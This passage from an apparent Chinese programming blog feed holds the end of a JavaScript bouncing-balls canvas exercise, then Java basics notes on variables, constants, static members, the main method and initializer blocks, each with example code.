class="hljs-comment">//计数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params"></span>)&#123;<br>  num = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>    <span class="hljs-keyword">if</span> (ball.<span class="hljs-property">exists</span>) &#123;<br>      num+=<span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> num;<br>&#125;<br><span class="hljs-keyword">let</span> countnum = <span class="hljs-title function_">count</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">loop</span>(<span class="hljs-params"></span>) &#123;<br>  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">&quot;rgba(0, 0, 0, 0.25)&quot;</span>;<br>  ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height);<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>    <span class="hljs-keyword">if</span> (ball.<span class="hljs-property">exists</span>) &#123;<br>      ball.<span class="hljs-title function_">draw</span>();<br>      ball.<span class="hljs-title function_">update</span>();<br>      ball.<span class="hljs-title function_">collisionDetect</span>();<br>    &#125;<br>  &#125;<br>  evilcircle.<span class="hljs-title function_">draw</span>();<br>  evilcircle.<span class="hljs-title function_">checkBounds</span>();<br>  evilcircle.<span class="hljs-title function_">collisionDetect</span>();<br>  ballcount.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Ball count: &quot;</span> + countnum;<br><br>  <span class="hljs-title function_">requestAnimationFrame</span>(loop);<br>&#125;<br><br><span class="hljs-title function_">loop</span>();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java基础——中</title>
    <link href="/2023/10/28/2023/java%E5%9F%BA%E7%A1%80%EF%BC%88%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5-%E4%B8%8A%EF%BC%89/"/>
    <url>/2023/10/28/2023/java%E5%9F%BA%E7%A1%80%EF%BC%88%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5-%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="变量、常量、对象"><a href="#变量、常量、对象" class="headerlink" title="变量、常量、对象"></a><strong>变量、常量、对象</strong></h1><p><strong>变量：</strong></p><p>程序的基本组成单位，相当于内存中一个数据存储空间的表示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> a;<br>a = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p><strong>常量</strong>：</p><p>final修饰的属性又叫常量，一般 用XX_XX_XX来命名。</p><p>在定义时<strong>，</strong>必须赋初值，并且以后不能再修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AA</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//在构造器中</span><br>        TAX_RATE2=<span class="hljs-number">1.1</span>;<br>    &#125;<br>    &#123;<span class="hljs-comment">//在代码块赋值</span><br>        TAX_RATE3=<span class="hljs-number">8.8</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>对象：</strong></p><p>Java 是面向对象的编程语言，对象就是面向对象程序设计的核心。</p><p>所谓<strong>对象就是真实世界中的实体，对象与实体是一一对应的，也就是说现实世界中每一个实体都是一个对象，它是一种具体的概念</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Cat cat;<span class="hljs-comment">//声明对象</span><br>cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(); <span class="hljs-comment">//创建</span><br></code></pre></td></tr></table></figure><h1 id="一些接口"><a href="#一些接口" class="headerlink" title="一些接口"></a>一些接口</h1><ul><li><strong>Iterable</strong> ——可迭代</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">java.util.<span class="hljs-built_in">Iterator</span><br></code></pre></td></tr></table></figure><ul><li><strong>Comparable</strong> ——可比较</li></ul><h1 id="章节十"><a href="#章节十" class="headerlink" title="章节十"></a>章节十</h1><p>类的五大成员：</p><p>（1）属性 </p><p>（2）方法 </p><p>（3）构造器</p><p>（4）代码块</p><p>（5）内部类</p><h2 id="1-类变量"><a href="#1-类变量" class="headerlink" title="1.类变量"></a>1.类变量</h2><h3 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h3><p>实例：加入小孩，统计小孩个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.static_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChildGame</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Child child1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&quot;白骨精&quot;</span>);<br>        child1.join();<br>        child1.count++;<br>        Child child2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&quot;狐狸精&quot;</span>);<br>        child2.join();<br>        child2.count++;<br>        Child child3= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&quot;黑熊精&quot;</span>);<br>        child3.join();<br>        child3.count++;<br>        System.out.println(child1.count+<span class="hljs-string">&quot;个小孩加入了游戏。&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//定义一个变量count，是一个类变量（静态变量）static 静态</span><br>    <span class="hljs-comment">//该变量最大的特点就是会被所有的对象实例共享</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Child</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">join</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(name+<span class="hljs-string">&quot;加入了游戏&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关于类的内存布局：不同的教材有不同的说法，jdk不同或许存放的地点不同。</p><p>但static类量是对象共享的，不管static变量在哪里。</p><p><strong>共识：</strong></p><p><strong>（1）static变量是同一个类所有对象共享。</strong></p><p><strong>（2）static变量在类加载时就生成了。</strong></p><h3 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h3><p>类变量也叫静态变量&#x2F;静态属性，是该类的所有对象共享的变量，任何一个该类的对象去访问它时，取到的都是相同的值。</p><p><strong>定义语法：</strong></p><p>访问修饰符 static 数据类型 变量名;[推荐]</p><p>static 访问修饰符 数据类型 变量名;</p><p><strong>访问变量：</strong></p><p>类名.类变量名[推荐]</p><p>对象名.类变量名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisitStatic</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//方法1</span><br>        <span class="hljs-comment">//类变量是随着类的加载而创建，所以及时没有创建对象实例也可以访问</span><br>        System.out.println(A.name);<br>        <span class="hljs-comment">//方法2</span><br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        System.out.println(a.name);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;韩顺平教育&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><blockquote><p>韩顺平教育</p><p>韩顺平教育</p></blockquote><h3 id="注意事项-amp-使用细节"><a href="#注意事项-amp-使用细节" class="headerlink" title="注意事项&amp;使用细节"></a>注意事项&amp;使用细节</h3><ol><li><p><strong>什么时候</strong>需要使用类变量？</p><p>当我们需要让某个类的所有对象都<strong>共享一个变量</strong>时，就可以考虑使用类变量（静态变量）。例如：定义学生类，统计所有学生共交多少钱。</p></li><li><p>类变量和实例变量（普通变量）<strong>区别</strong>？</p><p>类变量是该类所有对象共享的。</p><p>而实例变量是每个对象独享的。</p></li><li><p>加上static成为类变量或静态变量，否则成为实例变量&#x2F;普通变量&#x2F;非静态变量。</p></li><li><p>访问需要满足修饰符的访问权限和范围。</p></li><li><p>类变量的生命周期是随类的加载开始，随着类的消亡而销毁。</p></li></ol><h2 id="2-类方法"><a href="#2-类方法" class="headerlink" title="2.类方法"></a>2.类方法</h2><p>也叫静态方法。</p><p>形式：</p><p>访问修饰符 static 数据返回类型 方法名(){ } [推荐]</p><p>static 访问修饰符 数据返回类型 方法名(){ }</p><p>使用方法：类名.类方法名 或者 对象名.类对象名</p><p>举例：学生总学费</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.static_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Stu</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stu</span>(<span class="hljs-string">&quot;tom&quot;</span>);<br>        tom.payFee(<span class="hljs-number">100</span>);<br>        <span class="hljs-type">Stu</span> <span class="hljs-variable">mary</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stu</span>(<span class="hljs-string">&quot;mary&quot;</span>);<br>        mary.payFee(<span class="hljs-number">200</span>);<br>        Stu.showFee();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stu</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//定义一个静态变量，累计学费</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-variable">fee</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Stu</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-comment">//定义两个静态方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payFee</span><span class="hljs-params">(<span class="hljs-type">double</span> fee)</span>&#123;<br>        Stu.fee +=fee; <span class="hljs-comment">//累计到静态变量</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showFee</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;总学费有：&quot;</span>+Stu.fee);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总学费有：300.0</p></blockquote><h3 id="经典使用场景"><a href="#经典使用场景" class="headerlink" title="经典使用场景"></a>经典使用场景</h3><p>当方法不涉及到任何和对象相关的成员，可以将方法设计成静态方法，提高开发效率。</p><p>例如：工具类中的方法utils</p><p>Math类、Array类、Collection集合类。</p><p>实际开发中，程序员往往会将一些通用的方法，设计成静态方法，这样我们不需要创建对象就可以使用了。例如打印一维数组，冒泡排序，完成某个计算任务等……</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mytools</span>&#123;<br>    <span class="hljs-comment">//求出两个数的和</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calSum</span><span class="hljs-params">(<span class="hljs-type">double</span> n1,<span class="hljs-type">double</span> n2)</span>&#123;<br>        <span class="hljs-keyword">return</span> n1+n2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意事项-amp-使用细节-1"><a href="#注意事项-amp-使用细节-1" class="headerlink" title="注意事项&amp;使用细节"></a>注意事项&amp;使用细节</h3><p>1）类方法和普通方法都是随着类的加载而加载，将结构信息存储在方法区：</p><p><strong>类方法中无this的参数。</strong></p><p>普通方法中隐含着this的参数。</p><p>2）类方法可以通过类名调用，也可以通过对象名调用。</p><p>3）普通方法和对象有关，需要通过对象名调用，比如<strong>对象名．方法名</strong>（参数），不能通过类名用。</p><p>4）类方法中<strong>不允许使用和对象有关的关键字</strong>，比如<strong>this和super</strong>。普通方法（成员方法）可以。</p><p>5）<strong>类方法</strong>（静态方法）中<strong>只能访问静态变量或静态方法</strong> 。</p><p>6）普通成员方法，既可以访问普通变量（方法），也可以访问静态变量（方法）。</p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a><strong>题目1</strong></h4><blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221010090822904.png" alt="image-20221010090822904"></p></blockquote><p>9、10、11</p><h4 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a><strong>题目2</strong></h4><blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221010091600549.png" alt="image-20221010091600549"></p></blockquote><p>private int id改成private static int id，因为getTotalPerson是类方法，无法调用普通变量。</p><p>输出0、1。</p><h4 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h4><blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221010093354436.png" alt="image-20221010093354436"></p></blockquote><p>去掉this.total &#x3D; total。因为类方法不能使用this和super。</p><h2 id="3-深入理解main语法"><a href="#3-深入理解main语法" class="headerlink" title="3.深入理解main语法"></a>3.深入理解main语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br></code></pre></td></tr></table></figure><ol><li>main方法是java虚拟机调用</li><li><strong>java虚拟机</strong>需要调用类的main()方法，所以该对象的访问权限必须是<strong>public</strong></li><li>java虚拟机在执行main()方法时，<strong>不必创建对象</strong>，所以该方法必须是<strong>static</strong></li><li>该方法接受String类型的数组参数，该数组中保存执行java命令时传递给所运行的类的参数</li><li>java执行的程序 参数1 参数2 参数3</li></ol><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221014233347086.png" alt="image-20221014233347086"></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hello</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-comment">//args 是如何传入</span><br><span class="hljs-comment">//遍历显示</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;i &lt; args.length;i++) &#123;<br>System.out.println(<span class="hljs-string">&quot;第&quot;</span>+(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;个参数=&quot;</span> + args[i]);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>命令行输入如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">java hello <span class="hljs-regexp">//</span>无输出<br>java hello jack tom smith<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221014233518973.png" alt="image-20221014233518973" style="zoom:50%;" /><p>特别提示：</p><ul><li>在mian()方法中，我们可以直接调用main所在类的静态方法或静态属性</li><li>但是，不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main01</span> &#123;<br>    <span class="hljs-comment">//静态的变量，属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;韩顺平教育&quot;</span>;<br>    <span class="hljs-comment">//非静态的变量，属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;<br>    <span class="hljs-comment">//静态方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Main01的 hi方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//非静态的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Main01的 cry方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//可以直接使用name</span><br>        <span class="hljs-comment">//1.因为静态方法可以访问本类的静态成员</span><br>        System.out.println(<span class="hljs-string">&quot;name = &quot;</span>+name);<br>        hi();<br>        <span class="hljs-comment">//2.静态方法main不可访问本类的非静态成员</span><br>        <span class="hljs-comment">//3.如果静态方法main要访问本类的非静态成员，需要先创建对象，再调用即可</span><br>        <span class="hljs-type">Main01</span> <span class="hljs-variable">main01</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Main01</span>();<br>        System.out.println(main01.n1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-代码块"><a href="#4-代码块" class="headerlink" title="4.代码块"></a>4.代码块</h2><p><strong>介绍：</strong></p><p>代码化块又称为<strong>初始化块</strong>，属于类中的成员[即 是类的一部分]，类似于方法，将逻辑语句封装在方法体中，通过{}包围起来。</p><p>但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显示调用，而是加载类时，或创建对象时隐式调用。</p><p><strong>基本语法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">[修饰符]&#123;<br>代码<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>修饰符，可选，只能写static</li><li>代码块分两类，使用static叫静态代码块，没有static修饰的，叫普通代码块&#x2F;非静态代码块</li><li>逻辑语句可以为任何逻辑语句（输入、输出、方法调用、循环、判断等）</li><li>;号可以写上，也可以省略。</li></ol><p><strong>优点</strong></p><ol><li>相当于另一种形式的构造器（对构造器的补充机制），可以做初始化的操作</li><li>场景：如果多个构造器中都有重复的语句，可以抽取到初始化块中，<strong>提高代码的重用性</strong></li></ol><p>案例：电影</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlock01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Movie</span> <span class="hljs-variable">movie1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Movie</span>(<span class="hljs-string">&quot;你好李焕英&quot;</span>);<br>        <span class="hljs-type">Movie</span> <span class="hljs-variable">movie2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Movie</span>(<span class="hljs-string">&quot;唐探3&quot;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;陈思诚&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Movie</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;<br>    <span class="hljs-keyword">private</span> String director;<br><br>    <span class="hljs-comment">//3个构造器 = &gt;重载</span><br>    <span class="hljs-comment">//（1）下面的三个构造器都有相同的语句</span><br>    <span class="hljs-comment">//（2）这样看起来比较冗余</span><br>    <span class="hljs-comment">//（3）可以把相同的语句，放入同一个代码块中</span><br>    <span class="hljs-comment">//（4）这样无论调用哪一个构造器，都会先调用代码块的内容</span><br>    <span class="hljs-comment">//（5）代码块的调用优先于构造器</span><br><br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;电影屏幕打开...&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;广告开始...&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;电影正式开始...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Movie</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;Movie(String name)被调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Movie</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> price)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.price = price;<br>        System.out.println(<span class="hljs-string">&quot;Movie(String name, double price)被调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Movie</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> price, String director)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.price = price;<br>        <span class="hljs-built_in">this</span>.director = director;<br>        System.out.println(<span class="hljs-string">&quot;Movie(String name, double price, String director)被调用&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用细节"><a href="#使用细节" class="headerlink" title="使用细节"></a>使用细节</h3><h4 id="1）static代码块"><a href="#1）static代码块" class="headerlink" title="1）static代码块"></a>1）<strong>static代码块</strong></h4><p>也叫静态代码块，作用是<strong>对类进行初始化。</strong></p><p>而且它<strong>随着类的加载而执行</strong>，并且<strong>只能执行一次</strong>。如果是普通代码块，每创建一个对象，就执行。</p><h4 id="2）类什么时候被加载"><a href="#2）类什么时候被加载" class="headerlink" title="2）类什么时候被加载"></a><strong>2）类什么时候被加载</strong></h4><ul><li><strong>创建对象实例时（new）</strong></li><li><strong>创建子类对象实例，父类也会被加载</strong></li><li><strong>使用类的静态成员时（静态方法，静态属性）</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeBlock02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//类被加载的情况举例</span><br><span class="hljs-comment">//        1.创建对象实例时(new)</span><br><span class="hljs-comment">//        AA aa = new AA();</span><br><span class="hljs-comment">//        2.创建子类对象实例，父类也会被加载</span><br>        <span class="hljs-type">AA</span> <span class="hljs-variable">aa2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AA</span>();<br><span class="hljs-comment">//        3.使用类的静态成员时（静态方法，静态属性）</span><br>        System.out.println(Cat.n1);<br><br>    &#125;<br>&#125;<br><br><span 